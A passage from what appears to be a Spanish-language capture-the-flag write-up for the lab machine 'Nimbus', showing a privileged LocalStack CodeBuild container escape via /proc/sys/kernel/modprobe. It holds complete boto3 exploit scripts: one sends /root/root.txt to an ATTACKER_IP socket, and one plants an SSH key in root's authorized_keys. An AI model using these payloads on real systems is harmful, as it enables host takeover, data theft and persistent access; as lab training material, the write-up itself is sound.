+<a id="__codelineno-27-79" name="__codelineno-27-79" href="#__codelineno-27-79"></a><span class="w">                </span><span class="nv">MaxNumberOfMessages</span><span class="o">=</span><span class="m">1</span>,<span class="w"> </span><span class="nv">WaitTimeSeconds</span><span class="o">=</span>POLL_SECS<span class="o">)</span>
+<a id="__codelineno-27-80" name="__codelineno-27-80" href="#__codelineno-27-80"></a><span class="w">            </span><span class="k">for</span><span class="w"> </span>m<span class="w"> </span><span class="k">in</span><span class="w"> </span>resp.get<span class="o">(</span><span class="s2">"Messages"</span>,<span class="w"> </span><span class="o">[])</span>:
+<a id="__codelineno-27-81" name="__codelineno-27-81" href="#__codelineno-27-81"></a><span class="w">                </span>try:<span class="w"> </span>handle_message<span class="o">(</span>m<span class="o">[</span><span class="s2">"Body"</span><span class="o">])</span>
+<a id="__codelineno-27-82" name="__codelineno-27-82" href="#__codelineno-27-82"></a><span class="w">                </span>except<span class="w"> </span>Exception<span class="w"> </span>as<span class="w"> </span>e:<span class="w"> </span>print<span class="o">(</span>f<span class="s2">"[worker] error: {e}"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-83" name="__codelineno-27-83" href="#__codelineno-27-83"></a><span class="w">                </span>finally:
+<a id="__codelineno-27-84" name="__codelineno-27-84" href="#__codelineno-27-84"></a><span class="w">                    </span>sqs.delete_message<span class="o">(</span><span class="nv">QueueUrl</span><span class="o">=</span>QUEUE_URL,<span class="w"> </span><span class="nv">ReceiptHandle</span><span class="o">=</span>m<span class="o">[</span><span class="s2">"ReceiptHandle"</span><span class="o">])</span>
+<a id="__codelineno-27-85" name="__codelineno-27-85" href="#__codelineno-27-85"></a><span class="w">        </span>except<span class="w"> </span>Exception<span class="w"> </span>as<span class="w"> </span>e:
+<a id="__codelineno-27-86" name="__codelineno-27-86" href="#__codelineno-27-86"></a><span class="w">            </span>print<span class="o">(</span>f<span class="s2">"[worker] poll error: {e}"</span>,<span class="w"> </span><span class="nv">flush</span><span class="o">=</span>True<span class="o">)</span>
+<a id="__codelineno-27-87" name="__codelineno-27-87" href="#__codelineno-27-87"></a><span class="w">            </span>time.sleep<span class="o">(</span>POLL_SECS<span class="o">)</span>
+<a id="__codelineno-27-88" name="__codelineno-27-88" href="#__codelineno-27-88"></a>
+<a id="__codelineno-27-89" name="__codelineno-27-89" href="#__codelineno-27-89"></a><span class="k">if</span><span class="w"> </span><span class="nv">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">"__main__"</span>:
+<a id="__codelineno-27-90" name="__codelineno-27-90" href="#__codelineno-27-90"></a><span class="w">    </span>main<span class="o">()</span>
+</code></pre></div>
+<p>El script confirma que consume mensajes de la cola SQS alojada en el host 'floci:4566' y procesa el contenido utilizando la función 'yaml.load(...)'</p>
+<h3 id="revision-de-etchosts">Revisión de /etc/hosts<a class="headerlink" href="#revision-de-etchosts" title="Permanent link">¶</a></h3>
+<p>Revisamos ahora la resolución de nombres:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>worker@83db7f2f6a7e:/app$<span class="w"> </span>cat<span class="w"> </span>/etc/hosts
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>cat<span class="w"> </span>/etc/hosts
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="m">127</span>.0.0.1<span class="w">   </span>localhost
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>::1<span class="w"> </span>localhost<span class="w"> </span>ip6-localhost<span class="w"> </span>ip6-loopback
+<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>fe00::<span class="w">  </span>ip6-localnet
+<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>ff00::<span class="w">  </span>ip6-mcastprefix
+<a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>ff02::1<span class="w"> </span>ip6-allnodes
+<a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>ff02::2<span class="w"> </span>ip6-allrouters
+<a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a><span class="m">172</span>.18.0.1<span class="w">  </span>nimbus.htb
+<a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a><span class="m">172</span>.18.0.1<span class="w">  </span>aws.nimbus.htb
+<a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a><span class="m">172</span>.18.0.3<span class="w">  </span>83db7f2f6a7e
+</code></pre></div>
+<p>El archivo que muestra IP asignada a la 0.3 y que los nombres de los dominios externos resuelven hacia la 0.1 la cual funge como gateway del entorno virtualizado de Docker. Dado que el script interactúa con un host denominado 'floci', deducimos que la resolución se gestiona de forma dinámica mediante el DNS interno integrado del contenedor, apuntando de igual manera a la interfaz del host local.</p>
+<h2 id="4-movimiento-lateral-y-elevacion-a-codebuild">4. Movimiento Lateral y Elevación a CodeBuild<a class="headerlink" href="#4-movimiento-lateral-y-elevacion-a-codebuild" title="Permanent link">¶</a></h2>
+<p>Aprovechando que contamos con acceso local directo a la red interna, procedemos a examinar el estado de salud y los servicios activos expuestos en el puerto 4566 del host 'floci' utilizando un curl básico:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>worker@83db7f2f6a7e:/app$<span class="w"> </span>curl<span class="w"> </span>-s<span class="w"> </span>http://floci:4566/health
+</code></pre></div>
+<p>El servidor nos devuelve un payload en formato JSON indicando la versión y los servicios de ejecución:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="p p-Indicator">{</span><span class="w"> </span><span class="s">"edition"</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="s">"community"</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">"services"</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="p p-Indicator">{</span><span class="w"> </span><span class="s">"ssm"</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="s">"running"</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">"sqs"</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="s">"running"</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">"s3"</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="s">"running"</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">"codebuild"</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="s">"running"</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">"ecs"</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="s">"running"</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">"iam"</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="s">"running"</span><span class="w"> </span><span class="nv">// ...</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">cortado para brevedad</span><span class="p p-Indicator">]</span><span class="w"> </span><span class="nv">...</span><span class="w"> </span><span class="p p-Indicator">},</span><span class="w"> </span><span class="s">"version"</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="s">"1.5.17"</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">"original_edition"</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="s">"floci-always-free"</span><span class="w"> </span><span class="p p-Indicator">}</span>
+</code></pre></div>
+<p>La respuesta revela 2 puntos analíticos cruciales:
+- Prácticamente todo el stack simulado de AWS de LocalStack se encuentra activo, destacando los entornos de orquestación y despliegue como codebuild.
+- El entorno se identifica como 'floci-always-free'. Tradicionalmente, cuando se le realizan peticiones locales a LocalStack desde la red interna del contenedor, las restricciones restrictivas de las políticas IAM no son validadas de forma estricta.</p>
+<h3 id="evasion-de-restricciones">Evasión de restricciones<a class="headerlink" href="#evasion-de-restricciones" title="Permanent link">¶</a></h3>
+<p>Para verificar si podemos evadir la restricción original de 'Access denied' que sufríamos desde el exterior, utilizamos la herramienta 'aws' que tiene worker para enumerar los proyectos de CodeBuild apuntando explícitamente al endpoint interno:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>worker@83db7f2f6a7e:/app$<span class="w"> </span>aws<span class="w"> </span>codebuild<span class="w"> </span>list-projects<span class="w"> </span>--endpoint-url<span class="w"> </span>http://floci:4566<span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="s2">"projects"</span>:<span class="w"> </span><span class="o">[]</span><span class="w"> </span><span class="o">}</span>
+</code></pre></div>
+<h3 id="automatizacion-del-exploit-mediante-python-con-boto3">Automatización del exploit mediante Python con boto3<a class="headerlink" href="#automatizacion-del-exploit-mediante-python-con-boto3" title="Permanent link">¶</a></h3>
+<p>Intentar registrar un proyecto complejo con directivas directamente desde el CLI de AWS puede volverse tedioso (como ya estuve intentando varias veces), así que la mejor manera de trabajar de manera limpia es haciendo un script local en python usando la librería de boto3, la cual interactuará con la API de LocalStack.</p>
+<p>Diseñamos la lógica de explotación dividida en 2 etapas:
+- 1.- <strong>Estabilización del contenedor</strong>: Al instanciar la imagen floci/floci:latest, descubrimos que su script de inicialización valida la identidad del usuario e intenta forzar una degradación de privilegios. Para evitar que el contenedor se detenga abruptamente o bloquee la fase de compilación, inyectamos en las variables de entorno la función maliciosa BASH_FUNC_id. Al devolver un simple echo simulando un UID cero, engañamos al entrypoint de manera inmediata, garantizando que el contenedor permanezca vivo y pase limpiamente a procesar las directivas.
+- 2.- <strong>Escape por Kernel Usermode-Helper</strong>: Aprovechando que el proyecto se registrará forzando el modo privilegiado ('privilegedMode': True), el contenedor resultante no aplicará las máscaras de aislamiento habituales sobre el sistema de archivos jerárquico del kernel. En un contenedor estándar, el directorio '/proc/sys' se monta estrictamente como Read-Only (ro) para proteger al sistema anfitrión. Sin embargo, bajo un entorno privilegiado, esta restricción se elimina por completo.</p>
+<p>Para validar técnicamente esta condición antes de lanzar el ataque y confirmar que la variable 'modprobe' (encargada de invocar binarios en el host ante formatos desconocidos) acepta modificaciones desde nuestro espacio aislado, se evalúan las propiedades de montura del sistema: 
+</p><div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>worker@83db7f2f6a7e:/app$<span class="w"> </span>mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>/proc/sys<span class="w"> </span>proc<span class="w"> </span>on<span class="w"> </span>/proc/sys<span class="w"> </span><span class="nb">type</span><span class="w"> </span>proc<span class="w"> </span><span class="o">(</span>rw,nosuid,nodev,noexec,relatime<span class="o">)</span>
+</code></pre></div><p></p>
+<p>Al verificar que figura con permisos de lectura y escritura ('rw'), realizamos un test lógico de escritura directa sobre el archivo objetivo:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>worker@83db7f2f6a7e:/app$<span class="w"> </span><span class="o">[</span><span class="w"> </span>-w<span class="w"> </span>/proc/sys/kernel/modprobe<span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"vulnerable es escribible"</span>
+<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>vulnerable<span class="w"> </span>es<span class="w"> </span>escribible
+</code></pre></div>
+<p>Esta comprobación confirma el vector definitivo de escape. Utilizando las directivas del buildspec del nuevo proyecto, emplearemos 'awk' sobre '/proc/mounts' para identificar dinámicamente la ruta absoluta en la que el host real mapea el almacenamiento de nuestro contenedor ('upperdir'). Posteriormente, apuntaremos 'modprobe' hacia un script intermedio ('payload.sh') diseñado para devolvernos una Reverse Shell.</p>
+<p>Al ejecutar un archivo con bytes corruptos ('\xff\xff\xff\xff'), obligaremos al kernel de la máquina real (Host) a procesar nuestra conexión con máximos privilegios fuera del contenedor.</p>
+<p>Escribimos el script de automatización en /tmp/exploit.py:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">boto3</span>
+<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>
+<a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="n">ENDPOINT</span> <span class="o">=</span> <span class="s2">"http://floci:4566"</span>
+<a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="n">REGION</span> <span class="o">=</span> <span class="s2">"us-east-1"</span>
+<a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="n">ATTACKER_IP</span> <span class="o">=</span> <span class="s2">"&lt;tu_ip&gt;"</span>   <span class="c1"># Tu IP de tun0</span>
+<a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="n">LPORT</span> <span class="o">=</span> <span class="mi">9005</span>                   <span class="c1"># Puerto para la exfiltración</span>
+<a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>
+<a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a><span class="n">buildspec</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"""version: 0.2</span>
+<a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a><span class="s2">phases:</span>
+<a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a><span class="s2">  build:</span>
+<a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="s2">    commands:</span>
+<a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a><span class="s2">      - |</span>
+<a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a><span class="s2">        cat &gt; /tmp/payload.sh &lt;&lt; 'PYEOF'</span>
+<a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a><span class="s2">        #!/bin/sh</span>
+<a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a><span class="s2">        python3 -c "</span>
+<a id="__codelineno-34-16" name="__codelineno-34-16" href="#__codelineno-34-16"></a><span class="s2">        import socket</span>
+<a id="__codelineno-34-17" name="__codelineno-34-17" href="#__codelineno-34-17"></a><span class="s2">        s = socket.socket()</span>
+<a id="__codelineno-34-18" name="__codelineno-34-18" href="#__codelineno-34-18"></a><span class="s2">        s.connect(('</span><span class="si">{</span><span class="n">ATTACKER_IP</span><span class="si">}</span><span class="s2">', </span><span class="si">{</span><span class="n">LPORT</span><span class="si">}</span><span class="s2">))</span>
+<a id="__codelineno-34-19" name="__codelineno-34-19" href="#__codelineno-34-19"></a><span class="s2">        s.send(open('/root/root.txt','rb').read())</span>
+<a id="__codelineno-34-20" name="__codelineno-34-20" href="#__codelineno-34-20"></a><span class="s2">        s.close()</span>
+<a id="__codelineno-34-21" name="__codelineno-34-21" href="#__codelineno-34-21"></a><span class="s2">        "</span>
+<a id="__codelineno-34-22" name="__codelineno-34-22" href="#__codelineno-34-22"></a><span class="s2">        PYEOF</span>
+<a id="__codelineno-34-23" name="__codelineno-34-23" href="#__codelineno-34-23"></a><span class="s2">      - chmod +x /tmp/payload.sh</span>
+<a id="__codelineno-34-24" name="__codelineno-34-24" href="#__codelineno-34-24"></a><span class="s2">      - |</span>
+<a id="__codelineno-34-25" name="__codelineno-34-25" href="#__codelineno-34-25"></a><span class="s2">        upper=$(grep -o 'upperdir=[^,]*' /proc/mounts | head -n 1 | cut -d= -f2)</span>
+<a id="__codelineno-34-26" name="__codelineno-34-26" href="#__codelineno-34-26"></a><span class="s2">        echo "$upper/tmp/payload.sh" &gt; /proc/sys/kernel/modprobe</span>
+<a id="__codelineno-34-27" name="__codelineno-34-27" href="#__codelineno-34-27"></a><span class="s2">      - printf '</span><span class="se">\\</span><span class="s2">xff</span><span class="se">\\</span><span class="s2">xff</span><span class="se">\\</span><span class="s2">xff</span><span class="se">\\</span><span class="s2">xff' &gt; /tmp/x &amp;&amp; chmod +x /tmp/x &amp;&amp; /tmp/x; true</span>
+<a id="__codelineno-34-28" name="__codelineno-34-28" href="#__codelineno-34-28"></a><span class="s2">"""</span>
+<a id="__codelineno-34-29" name="__codelineno-34-29" href="#__codelineno-34-29"></a><span class="n">cb</span> <span class="o">=</span> <span class="n">boto3</span><span class="o">.</span><span class="n">client</span><span class="p">(</span><span class="s2">"codebuild"</span><span class="p">,</span> <span class="n">endpoint_url</span><span class="o">=</span><span class="n">ENDPOINT</span><span class="p">,</span> <span class="n">region_name</span><span class="o">=</span><span class="n">REGION</span><span class="p">)</span>
+</code></pre></div>
+<p>Tras realizar los primeros intentos diseñando un script orientado a devolver una rev shell, descubri por los logs que la sesión se cortaba de forma abrupta debido a la naturaleza de CodeBuild dentro de LocalStack. Una vez procesado el fallo binario de binfmt, el ciclo de vida del contenedor es destruido inmediatamente por el orquestador, impidiendo la estabilización de un canal interactivo convencional.</p>
+<h3 id="flag-de-root-antes-de-conseguir-root">Flag de root antes de conseguir root<a class="headerlink" href="#flag-de-root-antes-de-conseguir-root" title="Permanent link">¶</a></h3>
+<p>Ante esta limitación de tiempo y para convalidar que el vector de escape a nivel de Kernel realmente funcionaba, variamos la estrategia hacia una exfiltración de la root flag donde suele estar (/root/root.txt). Abrimos un oyente simple con netcat en nuestra máquina local:
+</p><div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>nimbus<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">9005</span>
+</code></pre></div><p></p>
+<p>Y ejecutamos la tarea asíncrona. La lectura por sockets de Python toma apenas un microsegundo, permitiendo exfiltrar la bandera de root antes de la recolección del entorno por el backend: </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>Listening<span class="w"> </span>on<span class="w"> </span><span class="m">0</span>.0.0.0<span class="w"> </span><span class="m">9005</span><span class="w"> </span>Connection<span class="w"> </span>received<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.129.33.139<span class="w"> </span><span class="m">51432</span><span class="w"> </span>f3a7d1894b904...<span class="w"> </span><span class="o">[</span>Flag<span class="w"> </span>de<span class="w"> </span>Root<span class="o">]</span>
+</code></pre></div>
+<h3 id="conseguir-acceso-a-root-por-llave-ssh">Conseguir acceso a Root por llave SSH<a class="headerlink" href="#conseguir-acceso-a-root-por-llave-ssh" title="Permanent link">¶</a></h3>
+<p>Aunque la obtención de la flag convalida el compromiso, la meta real en verdad es conseguir acceso a la máquina.</p>
+<p>Sabiendo que el exploit de modprobe se ejecuta con total eficacia como root en la máquina física, modificamos la acción del payload.sh para abusar del servicio SSH que corre de forma nativa en el host. En lugar de forzar una shell reversa inestable, reconfiguramos el script de explotación en Python para que el kernel inyecte de manera permanente nuestra clave pública RSA directamente en el archivo authorized_keys del administrador en el host real:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="err">```</span><span class="n">python</span>
+<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">boto3</span>
+<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>
+<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="n">ENDPOINT</span> <span class="o">=</span> <span class="s2">"http://floci:4566"</span>
+<a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="n">REGION</span> <span class="o">=</span> <span class="s2">"us-east-1"</span>
+<a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a><span class="n">SSH_KEY</span> <span class="o">=</span> <span class="s2">"ssh-rsa AAAAB3NzaC1y&lt;tu llave ssh&gt;</span>
+<a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>
+<a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a><span class="n">buildspec</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"""version: 0.2</span>
+<a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a><span class="s2">phases:</span>
+<a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a><span class="s2">  build:</span>
+<a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a><span class="s2">    commands:</span>
+<a id="__codelineno-37-12" name="__codelineno-37-12" href="#__codelineno-37-12"></a><span class="s2">      - |</span>
+<a id="__codelineno-37-13" name="__codelineno-37-13" href="#__codelineno-37-13"></a><span class="s2">        cat &gt; /tmp/payload.sh &lt;&lt; 'PYEOF'</span>
+<a id="__codelineno-37-14" name="__codelineno-37-14" href="#__codelineno-37-14"></a><span class="s2">        #!/bin/sh</span>
+<a id="__codelineno-37-15" name="__codelineno-37-15" href="#__codelineno-37-15"></a><span class="s2">        mkdir -p /root/.ssh</span>
+<a id="__codelineno-37-16" name="__codelineno-37-16" href="#__codelineno-37-16"></a><span class="s2">        echo '</span><span class="si">{</span><span class="n">SSH_KEY</span><span class="si">}</span><span class="s2">' &gt;&gt; /root/.ssh/authorized_keys</span>
+<a id="__codelineno-37-17" name="__codelineno-37-17" href="#__codelineno-37-17"></a><span class="s2">        chmod 700 /root/.ssh</span>
+<a id="__codelineno-37-18" name="__codelineno-37-18" href="#__codelineno-37-18"></a><span class="s2">        chmod 600 /root/.ssh/authorized_keys</span>
+<a id="__codelineno-37-19" name="__codelineno-37-19" href="#__codelineno-37-19"></a><span class="s2">        PYEOF</span>
+<a id="__codelineno-37-20" name="__codelineno-37-20" href="#__codelineno-37-20"></a><span class="s2">      - chmod +x /tmp/payload.sh</span>
+<a id="__codelineno-37-21" name="__codelineno-37-21" href="#__codelineno-37-21"></a><span class="s2">      - |</span>
+<a id="__codelineno-37-22" name="__codelineno-37-22" href="#__codelineno-37-22"></a><span class="s2">        upper=$(grep -o 'upperdir=[^,]*' /proc/mounts | head -n 1 | cut -d= -f2)</span>
+<a id="__codelineno-37-23" name="__codelineno-37-23" href="#__codelineno-37-23"></a><span class="s2">        echo "$upper/tmp/payload.sh" &gt; /proc/sys/kernel/modprobe</span>
+<a id="__codelineno-37-24" name="__codelineno-37-24" href="#__codelineno-37-24"></a><span class="s2">      - printf '</span><span class="se">\\</span><span class="s2">xff</span><span class="se">\\</span><span class="s2">xff</span><span class="se">\\</span><span class="s2">xff</span><span class="se">\\</span><span class="s2">xff' &gt; /tmp/x &amp;&amp; chmod +x /tmp/x &amp;&amp; /tmp/x; true</span>
+<a id="__codelineno-37-25" name="__codelineno-37-25" href="#__codelineno-37-25"></a><span class="s2">"""</span>
+<a id="__codelineno-37-26" name="__codelineno-37-26" href="#__codelineno-37-26"></a>
+<a id="__codelineno-37-27" name="__codelineno-37-27" href="#__codelineno-37-27"></a><span class="n">cb</span> <span class="o">=</span> <span class="n">boto3</span><span class="o">.</span><span class="n">client</span><span class="p">(</span><span class="s2">"codebuild"</span><span class="p">,</span> <span class="n">endpoint_url</span><span class="o">=</span><span class="n">ENDPOINT</span><span class="p">,</span> <span class="n">region_name</span><span class="o">=</span><span class="n">REGION</span><span class="p">)</span>
+<a id="__codelineno-37-28" name="__codelineno-37-28" href="#__codelineno-37-28"></a><span class="n">cb</span><span class="o">.</span><span class="n">update_project</span><span class="p">(</span>
+<a id="__codelineno-37-29" name="__codelineno-37-29" href="#__codelineno-37-29"></a>    <span class="n">name</span><span class="o">=</span><span class="s2">"nimbus-escape"</span><span class="p">,</span>
+<a id="__codelineno-37-30" name="__codelineno-37-30" href="#__codelineno-37-30"></a>    <span class="n">source</span><span class="o">=</span><span class="p">{</span><span class="s2">"type"</span><span class="p">:</span> <span class="s2">"NO_SOURCE"</span><span class="p">,</span> <span class="s2">"buildspec"</span><span class="p">:</span> <span class="n">buildspec</span><span class="p">},</span>
+<a id="__codelineno-37-31" name="__codelineno-37-31" href="#__codelineno-37-31"></a>    <span class="n">artifacts</span><span class="o">=</span><span class="p">{</span><span class="s2">"type"</span><span class="p">:</span> <span class="s2">"NO_ARTIFACTS"</span><span class="p">},</span>
+<a id="__codelineno-37-32" name="__codelineno-37-32" href="#__codelineno-37-32"></a>    <span class="n">environment</span><span class="o">=</span><span class="p">{{</span>
+<a id="__codelineno-37-33" name="__codelineno-37-33" href="#__codelineno-37-33"></a>        <span class="s2">"type"</span><span class="p">:</span> <span class="s2">"LINUX_CONTAINER"</span><span class="p">,</span>
+<a id="__codelineno-37-34" name="__codelineno-37-34" href="#__codelineno-37-34"></a>        <span class="s2">"image"</span><span class="p">:</span> <span class="s2">"floci/floci:latest"</span><span class="p">,</span>
+<a id="__codelineno-37-35" name="__codelineno-37-35" href="#__codelineno-37-35"></a>        <span class="s2">"computeType"</span><span class="p">:</span> <span class="s2">"BUILD_GENERAL1_SMALL"</span><span class="p">,</span>
+<a id="__codelineno-37-36" name="__codelineno-37-36" href="#__codelineno-37-36"></a>        <span class="s2">"privilegedMode"</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
+<a id="__codelineno-37-37" name="__codelineno-37-37" href="#__codelineno-37-37"></a>        <span class="s2">"environmentVariables"</span><span class="p">:</span> <span class="p">[</span>
+<a id="__codelineno-37-38" name="__codelineno-37-38" href="#__codelineno-37-38"></a>            <span class="p">{{</span><span class="s2">"name"</span><span class="p">:</span> <span class="s2">"BASH_FUNC_id</span><span class="si">%%</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"value"</span><span class="p">:</span> <span class="s1">'() {{ echo "uid=0(root) gid=0(root) groups=0(root)"; }}'</span><span class="p">,</span> <span class="s2">"type"</span><span class="p">:</span> <span class="s2">"PLAINTEXT"</span><span class="p">}}</span>
+<a id="__codelineno-37-39" name="__codelineno-37-39" href="#__codelineno-37-39"></a>        <span class="p">],</span>
+<a id="__codelineno-37-40" name="__codelineno-37-40" href="#__codelineno-37-40"></a>    <span class="p">}},</span>
+<a id="__codelineno-37-41" name="__codelineno-37-41" href="#__codelineno-37-41"></a>    <span class="n">serviceRole</span><span class="o">=</span><span class="s2">"arn:aws:iam::000000000000:role/codebuild-role"</span><span class="p">,</span>
+<a id="__codelineno-37-42" name="__codelineno-37-42" href="#__codelineno-37-42"></a><span class="p">)</span>
+<a id="__codelineno-37-43" name="__codelineno-37-43" href="#__codelineno-37-43"></a><span class="n">cb</span><span class="o">.</span><span class="n">start_build</span><span class="p">(</span><span class="n">projectName</span><span class="o">=</span><span class="s2">"nimbus-escape"</span><span class="p">)</span>
+</code></pre></div>
+<p>Lanzamos la prueba y probamos a conectarnos al equipo y comprobamos que no nos pide contraseña, consiguiendo así acceso total:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>nimbus<span class="w"> </span>ssh<span class="w"> </span>root@aws.nimbus.htb<span class="w">                   </span>
+<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>The<span class="w"> </span>authenticity<span class="w"> </span>of<span class="w"> </span>host<span class="w"> </span><span class="s1">'aws.nimbus.htb (10.129.33.139)'</span><span class="w"> </span>cant<span class="w"> </span>be<span class="w"> </span>established.
+<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>ED25519<span class="w"> </span>key<span class="w"> </span>fingerprint<span class="w"> </span>is:<span class="w"> </span>SHA256:5qkwPI6m/wtokgKube+SzSe8Eew7l45AuShWf63C1lo
+<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>This<span class="w"> </span>key<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>known<span class="w"> </span>by<span class="w"> </span>any<span class="w"> </span>other<span class="w"> </span>names.
+<a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>Are<span class="w"> </span>you<span class="w"> </span>sure<span class="w"> </span>you<span class="w"> </span>want<span class="w"> </span>to<span class="w"> </span><span class="k">continue</span><span class="w"> </span>connecting<span class="w"> </span><span class="o">(</span>yes/no/<span class="o">[</span>fingerprint<span class="o">])</span>?<span class="w"> </span>yes
+<a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>Warning:<span class="w"> </span>Permanently<span class="w"> </span>added<span class="w"> </span><span class="s1">'aws.nimbus.htb'</span><span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span><span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>known<span class="w"> </span>hosts.
+<a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a>Welcome<span class="w"> </span>to<span class="w"> </span>Ubuntu<span class="w"> </span><span class="m">24</span>.04.4<span class="w"> </span>LTS<span class="w"> </span><span class="o">(</span>GNU/Linux<span class="w"> </span><span class="m">6</span>.8.0-124-generic<span class="w"> </span>x86_64<span class="o">)</span>
+<a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a>
+<a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="w"> </span>*<span class="w"> </span>Documentation:<span class="w">  </span>https://help.ubuntu.com
+<a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a><span class="w"> </span>*<span class="w"> </span>Management:<span class="w">     </span>https://landscape.canonical.com
